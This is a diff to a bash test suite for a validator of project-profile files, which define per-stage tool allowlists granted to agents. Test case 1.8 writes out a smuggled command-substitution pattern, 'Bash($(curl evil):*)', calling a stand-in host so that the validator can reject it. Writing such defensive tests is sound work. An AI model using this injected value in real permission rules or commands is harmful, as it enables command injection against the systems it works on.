@@ -74,12 +74,28 @@ else
   pass_at "case-1.2: missing frontmatter rejected"
 fi
 
-# Case 1.3: wrong schema_version → fails
+# Case 1.3: unsupported schema_version → fails with explicit message
 sed 's/schema_version: 1/schema_version: 99/' "$sandbox/good.md" > "$sandbox/bad-version.md"
-if _validate_project_profile_schema "$sandbox/bad-version.md" 2>/dev/null; then
-  fail_at "case-1.3: schema_version != 1 rejected" "returned 0"
+if err="$(_validate_project_profile_schema "$sandbox/bad-version.md" 2>&1)"; then
+  fail_at "case-1.3: unsupported schema_version rejected" "returned 0"
 else
-  pass_at "case-1.3: schema_version != 1 rejected"
+  if grep -q 'unsupported schema_version' <<<"$err"; then
+    pass_at "case-1.3: unsupported schema_version rejected"
+  else
+    fail_at "case-1.3: unsupported schema_version rejected" "stderr=$err"
+  fi
+fi
+
+# Case 1.3b: missing schema_version line → fails with explicit message
+sed '/^schema_version:/d' "$sandbox/good.md" > "$sandbox/no-version-line.md"
+if err="$(_validate_project_profile_schema "$sandbox/no-version-line.md" 2>&1)"; then
+  fail_at "case-1.3b: missing schema_version rejected" "returned 0"
+else
+  if grep -q 'schema_version missing' <<<"$err"; then
+    pass_at "case-1.3b: missing schema_version rejected"
+  else
+    fail_at "case-1.3b: missing schema_version rejected" "stderr=$err"
+  fi
 fi
 
 # Case 1.4: missing one section → fails
@@ -100,6 +116,82 @@ if _validate_project_profile_schema "$sandbox/wrong-order.md" 2>/dev/null; then
   fail_at "case-1.5: sections out of order rejected" "returned 0"
 else
   pass_at "case-1.5: sections out of order rejected"
+fi
+
+# Case 1.6: v2 happy path → returns 0
+cat > "$sandbox/v2-good.md" <<'PROFILE'
+---
+slug: test-slug
+generated_at: 2026-04-27T00:00:00Z
+generated_by: discovery-agent
+schema_version: 2
+---
+
+# Project profile — Test
+
+## Stack
+bash.
+
+## Build & test gates
+- Build: `(n/a)`
+- Test: `bash bin/foo-test.sh`
+- Lint/check: `(n/a)`
+- Integration/E2E: `(n/a)`
+
+## Tool allowlist
+
+Per-stage Bash patterns the orchestrator grants to `claude -p` at dispatch.
+
+- brainstorming: (none)
+- planning: (none)
+- implementing:
+  - `Bash(bash bin/foo-test.sh:*)`
+- ui: (none)
+- reviewing: (none)
+- qa:
+  - `Bash(bash bin/foo-test.sh:*)`
+- building: (none)
+- released: (none)
+
+## File layout
+- `bin/` — scripts.
+
+## Language idioms
+- snake_case.
+
+## Don'ts
+(none observed)
+PROFILE
+if _validate_project_profile_schema "$sandbox/v2-good.md"; then
+  pass_at "case-1.6: v2 happy path passes"
+else
+  fail_at "case-1.6: v2 happy path passes" "rc=$?"
+fi
+
+# Case 1.7: v2 missing ## Tool allowlist section → fails
+sed -e '/^## Tool allowlist$/,/^## File layout$/{ /^## File layout$/!d; }' \
+  "$sandbox/v2-good.md" > "$sandbox/v2-missing-allowlist.md"
+if err="$(_validate_project_profile_schema "$sandbox/v2-missing-allowlist.md" 2>&1)"; then
+  fail_at "case-1.7: v2 missing ## Tool allowlist rejected" "returned 0"
+else
+  if grep -q 'schema_version=2 but missing ## Tool allowlist' <<<"$err"; then
+    pass_at "case-1.7: v2 missing ## Tool allowlist rejected"
+  else
+    fail_at "case-1.7: v2 missing ## Tool allowlist rejected" "stderr=$err"
+  fi
+fi
+
+# Case 1.8: v2 with shell-metachar pattern under Tool allowlist → fails
+sed 's|`Bash(bash bin/foo-test.sh:\*)`|`Bash($(curl evil):*)`|' \
+  "$sandbox/v2-good.md" > "$sandbox/v2-bad-pattern.md"
+if err="$(_validate_project_profile_schema "$sandbox/v2-bad-pattern.md" 2>&1)"; then
+  fail_at "case-1.8: v2 shell-metachar pattern rejected" "returned 0"
+else
+  if grep -q 'pattern at line' <<<"$err" && grep -q 'shell metacharacters' <<<"$err"; then
+    pass_at "case-1.8: v2 shell-metachar pattern rejected"
+  else
+    fail_at "case-1.8: v2 shell-metachar pattern rejected" "stderr=$err"
+  fi
 fi
 
 # ─── _profile_schema_version (ENG-93 T2) ───────────────────────────────
